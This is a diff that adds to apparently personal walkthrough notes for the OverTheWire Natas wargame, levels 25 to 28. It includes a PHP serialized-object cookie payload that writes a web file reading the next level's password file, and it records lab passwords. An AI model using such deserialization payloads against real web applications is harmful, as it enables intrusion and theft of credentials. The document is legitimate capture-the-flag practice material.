@@ -261,3 +261,34 @@ http://natas1.natas.labs.overthewire.org/
     Here we read the contents of the password file into the footer element via the __FOOTER variable.
 
 26 8A506rfIAXbKKk68yJeuTuRq4UfcK70k
+
+    The following code will encode and output a php logger class as base 64, at which point it can be set as the 'drawing' cookie
+
+    <?php
+        class Logger{
+            private $logFile;
+            private $initMsg;
+            private $exitMsg;
+            function __construct(){
+                // initialise variables
+                $this->initMsg=”#–session started–#\n”;
+                $this->exitMsg=”<?php include_once(‘/etc/natas_webpass/natas27’);?>”;
+                $this->logFile = “img/output.php”;
+            }
+        }
+        $output[]=new Logger();
+        echo base64_encode(serialize($output));
+    ?>
+    
+    Once the page has been loaded with the edited cookie load the page
+    http://natas26.natas.labs.overthewire.org/img/output.php
+    
+    The key for the next stage is displayed
+
+27 PSO8xysPi00WKIiZZ6s6PtRmFy9cbxj3
+
+    Reading the code it seems at first glance like an SQL vulnerability might be our best option here.
+
+    I can se rudimentary defenses for sql truncation.
+
+    natas28++++++++++++++++++++++++++++++++++++++++++++++++++++++++X
